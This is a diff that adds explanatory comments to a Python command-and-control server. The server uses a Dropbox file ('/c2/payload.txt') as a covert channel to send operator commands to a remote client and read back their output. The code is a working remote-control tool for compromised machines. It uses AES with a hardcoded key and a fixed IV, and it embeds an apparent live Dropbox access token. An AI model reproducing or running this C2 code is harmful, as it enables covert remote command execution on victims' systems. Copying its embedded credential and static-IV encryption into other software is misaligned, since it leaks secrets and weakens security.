@@ -1,3 +1,4 @@
+# Importing necessary libraries for Dropbox interaction, encryption, time management, and operating system interactions
 import dropbox
 import dropbox.files 
 import os
@@ -6,20 +7,20 @@ from Crypto.Cipher import AES
 from Crypto.Random import get_random_bytes
 from Crypto.Util.Padding import pad, unpad
 
-# Aes-128 Encryption
+# Section for AES-128 Encryption: Define a function to encrypt messages using AES in CBC mode.
 def encrypt_message(message):
     cipher = AES.new(key, AES.MODE_CBC, IV=CONST_IV)
     ct_bytes = cipher.encrypt(pad(message.encode(), AES.block_size))
     iv = cipher.iv
     return ct_bytes
 
-# Aes-128 bit Decryption
+# Section for AES-128 Decryption: Define a function to decrypt messages using AES in CBC mode.
 def decrypt_message(ct_bytes):
     cipher = AES.new(key, AES.MODE_CBC, iv=CONST_IV)
     pt = unpad(cipher.decrypt(ct_bytes), AES.block_size)
     return pt.decode()
 
-# Take user input and write it to the dropbox file
+# Section for Command Handling: Function to take user input, encrypt it, and write it to a Dropbox file.
 def write_cmd():
     command = input('$ ')
     encrypted_command = encrypt_message(command)
@@ -34,28 +35,25 @@ def write_cmd():
     except dropbox.exceptions.ApiError as err:
         print(f"Error while overwriting file: {err}")
     
-# Read the output written by the client from the dropbox file
+# Section for Output Handling: Function to read the output written by the client from the Dropbox file, decrypt it, and display it.
 def read_output():
     _, response = dbx.files_download(dropbox_path)
     command = response.content
     command = decrypt_message(command)
     print('[+] Successfully read output from Dropbox file')
     print(f'output->{command}')
-    
 
-
+# Main Section: Setup and command loop. Initializes encryption keys, Dropbox API, and enters main loop for command input.
 if __name__ == '__main__':
     key = "564cybereffectss".encode()
     CONST_IV = 'qwertyuiopasdfgh'.encode()
 
-
-    # Dropbox token
+    # Dropbox API token setup
     token = "sl.BzuQXugw07LSvyTMx14EaGiRJgk-YkrNRoKEL8U-YiLXWF_OkVDuiZPj5nARyFwHTtkoI4Q-gx3gUFH79Mb2ExVFmS9hd6QQqNdArX6SvNhXQiwX0ya5ScnFD7e16SqwqehBgDzbJb_DJoVvI1E4"
-
     dbx = dropbox.Dropbox(token)
     dropbox_path = '/c2/payload.txt'
 
-    # Check if the client has started
+    # Initial client connection check: Wait until client has successfully started and connected.
     while True:
         _, response = dbx.files_download(dropbox_path)
         msg = response.content
@@ -68,12 +66,6 @@ if __name__ == '__main__':
             print("[-] Waiting for the client to connect")
             time.sleep(10)
 
-    # start payload execution
+    # Continuous command handling loop: Accepts commands from the user, sends them to the client, and handles responses.
     while True:
         write_cmd()
-
-
-
-
-
-
